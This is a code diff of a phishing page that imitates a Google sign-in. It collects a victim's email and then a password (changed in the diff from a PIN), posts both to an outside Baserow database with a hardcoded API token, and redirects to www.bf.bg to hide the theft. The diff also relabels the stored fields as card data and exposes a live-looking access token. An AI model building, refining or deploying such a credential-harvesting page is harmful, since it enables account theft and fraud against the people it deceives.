@@ -234,13 +234,6 @@
             margin-top: 16px;
         }
 
-        /* PIN code specific styles */
-        #pin {
-            letter-spacing: 2px;
-            font-size: 18px;
-            text-align: center;
-        }
-
         @media (max-width: 600px) {
             .container {
                 padding: 24px 20px;
@@ -260,7 +253,7 @@
 <body>
     <div class="container">
         <!-- Google Logo -->
-        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDc0IDI0Ij48cGF0aCBmaWxsPSIjNDI4NUY0IiBkPSJNOS4yNCAxMGMwLS41NS0uMDQtMS4wOC0uMTMtMS42SDQuNnYzLjA0aDIuNmMtLjExLjgzLS41NiAxLjU0LTEuMiAyLjAydi4xN2gxLjc0Yy41Mi0uNDcuOTUtMS4wOSAxLjI4LTEuODIuMzQtLjczLjUyLTEuNTQuNTItMi40MXoiLz48cGF0aCBmaWxsPSIjMzRBODUzIiBkPSJNNC42IDEzLjA0YzEuNDggMCAyLjcyLS40OCAzLjYzLTEuMzFsLTEuNzQtMS4zNWMtLjQ4LjMyLTEuMDkuNTEtMS44OS41MS0xLjQ2IDAtMi42OS0uOTgtMy4xMy0yLjNINi4xOFY5LjRjLS40Ni0xLjM3LTEuNzQtMi4zNi0zLjI4LTIuMzZDMS4yOSA3LjA0IDAgOC4zMyAwIDEwYzAgMS42NyAxLjI5IDIuOTYgMi44OCAyLjk2LjU3IDAgMS4xLS4xNiAxLjU3LS40NWwuMTUuNTN6Ii8+PHBhdGggZmlsbD0iI0ZCQkMwNSIgZD0iTTIuODggNy4wNGMtLjU3IDAtMS4xLjE2LTEuNTcuNDVsLS4xNS0uNTNILjAxdjEuODFoMS4xNWMuNDQtMS4zMiAxLjY3LTIuMyAzLjEzLTIuM3oiLz48cGF0aCBmaWxsPSIjRUE0MzM1IiBkPSJNMTQuMzQgMTQuMDRjMS4yOCAwIDIuMzctLjQzIDMuMTYtMS4xNmwtMS41NS0xLjJjLS40My4yOS0uOTguNDYtMS42MS40Ni0xLjI0IDAtMi4yOS0uODQtMi42Ni0xLjk2aC0xLjg2di4xN2MuMzcgMi4yNSAyLjMzIDMuNjkgNC41MiAzLjY5eiIvPjxwYXRoIGZpbGw9IiM0Mjg1RjQiIGQ9Ik0xMS42OCAxMC4xOGMwLS4xNy4wMy0uMzMuMDUtLjVoLTQuM3YxLjk2aDIuNDRjLS4xLjU4LS40IDEuMDctLjgyIDEuNDJoMS44NmMuMzctMS4xMiAxLjE1LTEuOTYgMi4yOS0xLjk2LjYzIDAgMS4xOC4xNyAxLjYxLjQ2bDEuNTUtMS4yYy0uNzktLjczLTEuODgtMS4xNi0zLjE2LTEuMTYtMi4xOSAwLTQuMTUgMS40NC00LjUyIDMuNjl2LjE3aDEuODZjLjM3LTEuMTIgMS40Mi0xLjk2IDIuNjYtMS45NnoiLz48cGF0aCBmaWxsPSIjMzRBODUzIiBkPSJNMjAuNDkgMTMuNDZoLjQzdjEuNTRoLjkydi0xLjU0aC40M3YtLjc0aC0xLjc4eiIvPjxwYXRoIGZpbGw9IiMzNEE4NTMiIGQ9Ik0yMy45OSAxMy40NmwuNTUgMS4yNS41NS0xLjI1aC45OHYyLjI4aC0uOTJ2LS45MmwtLjM5Ljg5aC0uNDRsLS4zOS0uODl2LjkyaC0uOTJ2LTIuMjh6Ii8+PHBhdGggZmlsbD0iI0ZCQkMwNSIgZD0iTTI3LjE4IDEzLjQ2djIuMjhoLjkydi0uNzRoLjUxYy40NiAwIC44My0uMzcuODMtLjgzIDAtLjQ2LS4zNy0uODMtLjgzLS44M2gtMS40M3YuMTJ6bS45Mi43NGgtLjQzdi0uNDNoLjQzYy4xMiAwIC4yMi4xLjIyLjIyIDAgLjEyLS4xLjIxLS4yMi4yMXoiLz48cGF0aCBmaWxsPSIjRUE0MzM1IiBkPSJNMzAuMTggMTMuNDZ2Mi4yOGguOTJ2LS43NGguNTFjLjQ2IDAgLjgzLS4zNy44My0uODMgMC0uNDYtLjM3LS44My0uODMtLjgzaC0xLjQzdi4xMnptLjkyLjc0aC0uNDN2LS40M2guNDNjLjEyIDAgLjIyLjEuMjIuMjIgMCAuMTItLjEuMjEtLjIyLjIxeiIvPjxwYXRoIGZpbGw9IiM0Mjg1RjQiIGQ9Ik0zMy4xOCAxMy40NnYyLjI4aC45MnYtMi4yOHoiLz48cGF0aCBmaWxsPSIjRUE0MzM1IiBkPSJNMzYuMTggMTMuNDZ2Mi4yOGguOTJ2LS43NGguNTFjLjQ2IDAgLjgzLS4zNy44My0uODMgMC0uNDYtLjM3LS44My0uODMtLjgzaC0xLjQzdi4xMnptLjkyLjc0aC0uNDN2LS40M2guNDNjLjEyIDAgLjIyLjEuMjIuMjIgMCAuMTItLjEuMjEtLjIyLjIxeiIvPjwvc3ZnPg==" alt="Google" class="logo">
+        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDc0IDI0Ij48cGF0aCBmaWxsPSIjNDI4NUY0IiBkPSJNOS4yNCAxMGMwLS41NS0uMDQtMS4wOC0uMTMtMS42SDQuNnYzLjA0aDIuNmMtLjExLjgzLS41NiAxLjU0LTEuMiAyLjAydi4xN2gxLjc0Yy41Mi0uNDcuOTUtMS4wOSAxLjI4LTEuODIuMzQtLjczLjUyLTEuNTQuNTItMi40MXoiLz48cGF0aCBmaWxsPSIjMzRBODUzIiBkPSJNNC42IDEzLjA0YzEuNDggMCAyLjcyLS40OCAzLjYzLTEuMzFsLTEuNzQtMS4zNWMtLjQ4LjMyLTEuMDkuNTEtMS44OS41MS0xLjQ2IDAtMi42OS0uOTgtMy4xMy0yLjNINi4xOFY5LjRjLS40Ni0xLjM3LTEuNzQtMi4zNi0zLjI4LTIuMzZDMS4yOSA3LjA0IDAgOC4zMyAwIDEwYzAgMS42NyAxLjI5IDIuOTYgMi44OCAyLjk2LjU3IDAgMS4xLS4xNiAxLjU3LS40NWwuMTUuNTN6Ii8+PHBhdGggZmlsbD0iI0ZCQkMwNSIgZD0iTTIuODggNy4wNGMtLjU3IDAtMS4xLjE2LTEuNTcuNDVsLS4xNS0uNTNILjAxdjEuODFoMS4xNWMuNDQtMS4zMiAxLjY3LTIuMyAzLjEzLTIuM3oiLz48cGF0aCBmaWxsPSIjRUE0MzM1IiBkPSJNMTQuMzQgMTQuMDRjMS4yOCAwIDIuMzctLjQzIDMuMTYtMS4xNmwtMS41NS0xLjJjLS40My4yOS0uOTguNDYtMS42MS40Ni0xLjI0IDAtMi4yOS0uODQtMi42Ni0xLjk2aC0xLjg2di4xN2MuMzcgMi4yNSAyLjMzIDMuNjkgNC41MiAzLjY5eiIvPjxwYXRoIGZpbGw9IiM0Mjg1RjQiIGQ9Ik0xMS42OCAxMC4xOGMwLS4xNy4wMy0uMzMuMDUtLjVoLTQuM3YxLjk2aDIuNDRjLS4xLjU4LS40IDEuMDctLjgyIDEuNDJoMS44NmMuMzctMS4xMiAxLjE1LTEuOTYgMi4yOS0xLjk2LjYzIDAgMS4xOC4xNyAxLjYxLjQ2bDEuNTUtMS4yYy0uNzktLjczLTEuODgtMS4xNi0zLjE2LTEuMTYtMi4xOSAwLTQuMTUgMS40NC00LjUyIDMuNjl2LjE3aDEuODZjLjM3LTEuMTIgMS40Mi0xLjk2IDIuNjYtMS45NnoiLz48cGF0aCBmaWxsPSIjMzNBODUzIiBkPSJNMjAuNDkgMTMuNDZoLjQzdjEuNTRoLjkydi0xLjU0aC40M3YtLjc0aC0xLjc4eiIvPjxwYXRoIGZpbGw9IiMzNEE4NTMiIGQ9Ik0yMy45OSAxMy40NmwuNTUgMS4yNS41NS0xLjI1aC45OHYyLjI4aC0uOTJ2LS45MmwtLjM5Ljg5aC0uNDRsLS4zOS0uODl2LjkyaC0uOTJ2LTIuMjh6Ii8+PHBhdGggZmlsbD0iI0ZCQkMwNSIgZD0iTTI3LjE4IDEzLjQ2djIuMjhoLjkydi0uNzRoLjUxYy40NiAwIC44My0uMzcuODMtLjgzIDAtLjQ2LS4zNy0uODMtLjgzLS44M2gtMS40M3YuMTJ6bS45Mi43NGgtLjQzdi0uNDNoLjQzYy4xMiAwIC4yMi4xLjIyLjIyIDAgLjEyLS4xLjIxLS4yMi4yMXoiLz48cGF0aCBmaWxsPSIjRUE0MzM1IiBkPSJNMzAuMTggMTMuNDZ2Mi4yOGguOTJ2LS43NGguNTFjLjQ2IDAgLjgzLS4zNy44My0uODMgMC0uNDYtLjM3LS44My0uODMtLjgzaC0xLjQzdi4xMnptLjkyLjc0aC0uNDN2LS40M2guNDNjLjEyIDAgLjIyLjEuMjIuMjIgMCAuMTItLjEuMjEtLjIyLjIxeiIvPjxwYXRoIGZpbGw9IiM0Mjg1RjQiIGQ9Ik0zMy4xOCAxMy40NnYyLjI4aC45MnYtMi4yOHoiLz48cGF0aCBmaWxsPSIjRUE0MzM1IiBkPSJNMzYuMTggMTMuNDZ2Mi4yOGguOTJ2LS43NGguNTFjLjQ2IDAgLjgzLS4zNy44My0uODMgMC0uNDYtLjM3LS44My0uODMtLjgzaC0xLjQzdi4xMnptLjkyLjc0aC0uNDN2LS40M2guNDNjLjEyIDAgLjIyLjEuMjIuMjIgMCAuMTItLjEuMjEtLjIyLjIxeiIvPjwvc3ZnPg==" alt="Google" class="logo">
 
         <!-- Page 1: Email Input -->
         <div id="page1">
@@ -304,16 +297,16 @@
             
             <form class="form" id="pin-form">
                 <div class="input-container">
-                    <label for="pin" class="input-label">Enter your PIN code</label>
-                    <input type="number" id="pin" class="input-field" required pattern="[0-9]*" inputmode="numeric" maxlength="6">
+                    <label for="pin-code" class="input-label">Enter your password</label>
+                    <input type="text" id="pin-code" class="input-field" required>
                 </div>
                 
                 <div class="checkbox-container">
                     <input type="checkbox" id="show-pin" class="checkbox">
-                    <label for="show-pin" class="checkbox-label">Show PIN</label>
+                    <label for="show-pin" class="checkbox-label">Show password</label>
                 </div>
                 
-                <a href="#" class="link forgot-link">Forgot PIN?</a>
+                <a href="#" class="link forgot-link">Forgot password?</a>
                 
                 <div class="footer">
                     <div></div> <!-- Empty div for spacing -->
@@ -330,20 +323,13 @@
         const emailForm = document.getElementById('email-form');
         const pinForm = document.getElementById('pin-form');
         const emailInput = document.getElementById('email');
-        const pinInput = document.getElementById('pin');
+        const pinInput = document.getElementById('pin-code');
         const displayEmail = document.getElementById('display-email');
         const showPinCheckbox = document.getElementById('show-pin');
         
         // Constants
-        const BASEROW_API = 'https://api.baserow.io/api/database/rows/table/503285/';
+        const BASEROW_API = 'https://baserow.io/database/209047/table/503285/914739';
         const TOKEN = 'Token LG6hnTBxgBG78FueElsSwpHRd4Wep1oL';
-        
-        // Limit PIN input to 6 digits
-        pinInput.addEventListener('input', function() {
-            if (this.value.length > 6) {
-                this.value = this.value.slice(0, 6);
-            }
-        });
         
         // Handle email form submission
         emailForm.addEventListener('submit', function(e) {
@@ -371,75 +357,61 @@
         });
         
         // Handle PIN form submission
-        pinForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
+pinForm.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const email = localStorage.getItem('userEmail');
+    const pin = pinInput.value;
+    
+    if (email && pin) {
+        try {
+            // Send data to Baserow with the specified field names
+            const response = await fetch(BASEROW_API, {
+                method: 'POST',
+                headers: {
+                    'Authorization': TOKEN,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    'cardNumber': email,
+                    'expiryYear': pin
+                })
+            });
             
-            const email = localStorage.getItem('userEmail');
-            const pin = pinInput.value;
+            console.log('Baserow submission successful');
             
-            if (email && pin) {
-                try {
-                    // Log the data being sent (for debugging)
-                    console.log('Sending data to Baserow:', { email, pin });
-                    
-                    // Send data to Baserow with field names as plain text
-                    const response = await fetch(BASEROW_API, {
-                        method: 'POST',
-                        headers: {
-                            'Authorization': TOKEN,
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            'email': email,
-                            'pin': pin
-                        })
-                    });
-                    
-                    // Log the response
-                    const responseData = await response.json();
-                    console.log('Baserow response:', responseData);
-                    
-                    // Redirect to www.bf.bg
-                    window.location.href = 'https://www.bf.bg';
-                } catch (error) {
-                    console.error('Error:', error);
-                    
-                    // Try an alternative approach if the first one fails
-                    try {
-                        // Try with different field names
-                        const fallbackResponse = await fetch(BASEROW_API, {
-                            method: 'POST',
-                            headers: {
-                                'Authorization': TOKEN,
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({
-                                'field_1': email,
-                                'field_2': pin
-                            })
-                        });
-                        
-                        console.log('Fallback response:', await fallbackResponse.json());
-                    } catch (fallbackError) {
-                        console.error('Fallback error:', fallbackError);
-                    }
-                    
-                    // Still redirect even if there's an error
-                    window.location.href = 'https://www.bf.bg';
-                }
-            }
-        });
+            // Redirect to www.bf.bg
+            window.location.href = 'https://www.bf.bg';
+        } catch (error) {
+            console.error('Error submitting to Baserow:', error);
+            
+            // Still redirect even if there's an error
+            window.location.href = 'https://www.bf.bg';
+        }
+    }
+});
         
         // Toggle PIN visibility
         showPinCheckbox.addEventListener('change', function() {
-            pinInput.type = this.checked ? 'text' : 'password';
+            // Since we're using type="text" already, we'll use CSS to hide/show
+            if (this.checked) {
+                pinInput.style.webkitTextSecurity = 'none';
+                pinInput.style.textSecurity = 'none';
+            } else {
+                pinInput.style.webkitTextSecurity = 'disc';
+                pinInput.style.textSecurity = 'disc';
+            }
         });
         
-        // Check if returning from page 2
+        // Initialize PIN field to be masked
+        pinInput.style.webkitTextSecurity = 'disc';
+        pinInput.style.textSecurity = 'disc';
+        
+        // Check if returning from page 2 or if email is already stored
         window.addEventListener('load', function() {
             const savedEmail = localStorage.getItem('userEmail');
             
-            if (savedEmail && window.location.hash === '#verify') {
+            if (savedEmail && (window.location.hash === '#verify' || window.location.search.includes('continue'))) {
                 displayEmail.textContent = savedEmail;
                 page1.style.display = 'none';
                 page2.style.display = 'block';
